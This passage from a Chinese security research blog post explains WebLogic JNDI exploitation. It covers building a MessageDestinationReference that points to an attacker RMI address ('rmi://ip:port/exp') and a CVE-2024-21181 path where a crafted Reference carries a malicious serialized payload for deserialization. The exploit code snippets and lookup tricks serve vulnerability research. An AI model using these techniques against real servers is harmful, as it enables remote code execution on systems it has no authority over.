+</span></span></code></pre></div><p>需要bind一个<code>MessageDestinationReference</code>对象。其构造方法允许指定jndiName：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#a6e22e">MessageDestinationReference</span>(Environment env, MessageDestinationRefBean msgDest, String jndiName, String providerURL, String initialContextFactory) <span style="color:#66d9ef">throws</span> EnvironmentException {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">super</span>(env, msgDest.<span style="color:#a6e22e">getMessageDestinationType</span>(), <span style="color:#e6db74">&#34;weblogic.application.naming.MessageDestinationObjectFactory&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">jndiName</span> <span style="color:#f92672">=</span> jndiName;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">providerURL</span> <span style="color:#f92672">=</span> providerURL;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">initialContextFactory</span> <span style="color:#f92672">=</span> initialContextFactory;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>似乎需要在weblogic运行时才能<code>msgDest.getMessageDestinationType()</code>，本地会报错，用javassist改一下就可以了：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>CtClass MessageDestinationReferenceCtClass <span style="color:#f92672">=</span> pool.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;weblogic.application.naming.MessageDestinationReference&#34;</span>);
+</span></span><span style="display:flex;"><span>CtConstructor<span style="color:#f92672">[]</span> cons <span style="color:#f92672">=</span> MessageDestinationReferenceCtClass.<span style="color:#a6e22e">getDeclaredConstructors</span>();
+</span></span><span style="display:flex;"><span>CtConstructor MessageDestinationReferenceCon <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span>(CtConstructor con : cons){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (con.<span style="color:#a6e22e">getParameterTypes</span>()<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>.<span style="color:#a6e22e">getName</span>().<span style="color:#a6e22e">equals</span>(<span style="color:#e6db74">&#34;weblogic.application.naming.Environment&#34;</span>)){
+</span></span><span style="display:flex;"><span>        MessageDestinationReferenceCon <span style="color:#f92672">=</span> con;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (MessageDestinationReferenceCon <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>){
+</span></span><span style="display:flex;"><span>    System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;con not found&#34;</span>);
+</span></span><span style="display:flex;"><span>    System.<span style="color:#a6e22e">exit</span>(0);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>MessageDestinationReferenceCon.<span style="color:#a6e22e">setBody</span>(<span style="color:#e6db74">&#34;{\n&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;        super($1, \&#34;java.lang.Object\&#34;, \&#34;weblogic.application.naming.MessageDestinationObjectFactory\&#34;);\n&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;        this.jndiName = $3;\n&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;        this.providerURL = $4;\n&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;        this.initialContextFactory = $5;\n&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;    }&#34;</span>);
+</span></span><span style="display:flex;"><span>MessageDestinationReferenceCtClass.<span style="color:#a6e22e">detach</span>();
+</span></span><span style="display:flex;"><span>MessageDestinationReferenceCtClass.<span style="color:#a6e22e">toClass</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MessageDestinationReference messageDestinationReference <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> MessageDestinationReference(<span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>, <span style="color:#e6db74">&#34;rmi://ip:port/exp&#34;</span>, <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>);
+</span></span></code></pre></div><p>回到前面，restOfName就是双引号之外的数据而且restOfName和第二个双引号直接要有一个<code>.</code>或<code>/</code>，类似这样：<code>&quot;&lt;name&gt;&quot;/&lt;restOfName&gt;</code>，bind用name，lookup用name + restOfName。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>context.<span style="color:#a6e22e">rebind</span>(<span style="color:#e6db74">&#34;asda&#34;</span>, ref);
+</span></span><span style="display:flex;"><span>context.<span style="color:#a6e22e">lookup</span>(<span style="color:#e6db74">&#34;\&#34;asda\&#34;/asd&#34;</span>);
+</span></span></code></pre></div><p>堆栈：</p>
+<pre tabindex="0"><code>javax.naming.InitialContext#lookup
+weblogic.application.naming.MessageDestinationReference#lookupMessageDestination
+weblogic.application.naming.MessageDestinationObjectFactory#getObjectInstance
+javax.naming.spi.NamingManager#getObjectInstance
+javax.naming.spi.NamingManager#getContext
+javax.naming.spi.ContinuationContext#getTargetContext
+javax.naming.spi.NamingManager#getContinuationContext
+weblogic.jndi.internal.BasicNamingNode#getContinuationCtx
+weblogic.jndi.internal.BasicNamingNode#lookupSharable
+weblogic.jndi.internal.PartitionHandler#lookupSharable
+weblogic.jndi.internal.ServerNamingNode#lookup
+weblogic.jndi.internal.RootNamingNode#lookup
+weblogic.jndi.internal.WLEventContextImpl#lookup
+weblogic.jndi.internal.WLContextImpl#lookup
+javax.naming.InitialContext#lookup
+weblogic.corba.cos.naming.NamingContextImpl#resolveObject
+</code></pre><h2 id="cve-2024-21181">CVE-2024-21181<a hidden class="anchor" aria-hidden="true" href="#cve-2024-21181">#</a></h2>
+<blockquote>
+<p>Weblogic 12.2.1.4</p>
+<p>JDK8u65</p>
+</blockquote>
+<p>另一个工厂类<code>weblogic.management.mbeanservers.partition.PartitionedMbsRefObjFactory</code>其<code>getObjectInstance</code>方法代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">getObjectInstance</span>(Object obj, Name name, Context nameCtx, Hashtable<span style="color:#f92672">&lt;?</span>, <span style="color:#f92672">?&gt;</span> environment) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>    Reference ref <span style="color:#f92672">=</span> (Reference)Reference.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">cast</span>(obj);
+</span></span><span style="display:flex;"><span>    String pName <span style="color:#f92672">=</span> (String)ref.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;partitionName&#34;</span>).<span style="color:#a6e22e">getContent</span>();
+</span></span><span style="display:flex;"><span>    JVMID jvmId <span style="color:#f92672">=</span> (JVMID)<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">deserialize</span>((<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span>)((<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span>)ref.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;jvmId&#34;</span>).<span style="color:#a6e22e">getContent</span>()));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>jvmId.<span style="color:#a6e22e">isLocal</span>()) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> Exception(name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; cannot be looked up using a remote JNDI context. Use JSR160 interface to use JMX remotely or use a local JNDI context to look up the local MBeanServer.&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        MBeanServer delegateMbs <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getDelegateMbs</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">assert</span> delegateMbs <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">new</span> PartitionedMbsFactory()).<span style="color:#a6e22e">create</span>(pName, delegateMbs);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>deserialize</code>方法就是java原生反序列化，lookup一个<code>Reference</code>并指定工厂类即可。</p>
+<p>可以参考<code>weblogic.management.mbeanservers.partition.PartitionedMbsRefObjFactory#createReference</code>的代码写。需要注意的是<code>PartitionedMbsRefObjFactory</code>是抽象类，要找一个实现类比如<code>PartitionedDomainRuntimeMbsRefObjFactory</code></p>
+<p>生成Reference:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>StringRefAddr addr <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringRefAddr(<span style="color:#e6db74">&#34;partitionName&#34;</span>, <span style="color:#e6db74">&#34;asas&#34;</span>);
+</span></span><span style="display:flex;"><span>Reference reference <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Reference(MBeanServer.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getName</span>(), addr, PartitionedDomainRuntimeMbsRefObjFactory.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getName</span>(), (String)<span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>RefAddr jvmIdAddr <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BinaryRefAddr(<span style="color:#e6db74">&#34;jvmId&#34;</span>, getEvilData());
+</span></span><span style="display:flex;"><span>reference.<span style="color:#a6e22e">add</span>(jvmIdAddr);
+</span></span></code></pre></div><p>12.2.1.4版本的CC为3.2.2版本，CC链不能利用了。</p>
+<h1 id="参考">参考<a hidden class="anchor" aria-hidden="true" href="#参考">#</a></h1>
+<p><a href="http://drops.xmd5.com/static/drops/web-13470.html">http://drops.xmd5.com/static/drops/web-13470.html</a></p>
+<p><a href="https://boogipop.com/2023/04/26/Weblogic%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">https://boogipop.com/2023/04/26/Weblogic%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</a></p>
+<p><a href="https://github.com/Y4er/CVE-2020-2551">https://github.com/Y4er/CVE-2020-2551</a></p>
+<p><a href="https://l3yx.github.io/2020/04/22/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://l3yx.github.io/2020/04/22/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
+<p><a href="https://xz.aliyun.com/news/7094">https://xz.aliyun.com/news/7094</a></p>
+<p><a href="https://mp.weixin.qq.com/s/Mh9BDkKP79BPEYdAt5uhaw">https://mp.weixin.qq.com/s/Mh9BDkKP79BPEYdAt5uhaw</a></p>
+<p><a href="https://xz.aliyun.com/news/13742">https://xz.aliyun.com/news/13742</a></p>
+<p><a href="https://xz.aliyun.com/news/14609">https://xz.aliyun.com/news/14609</a></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://zoiltin.github.io/">zoiltin&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
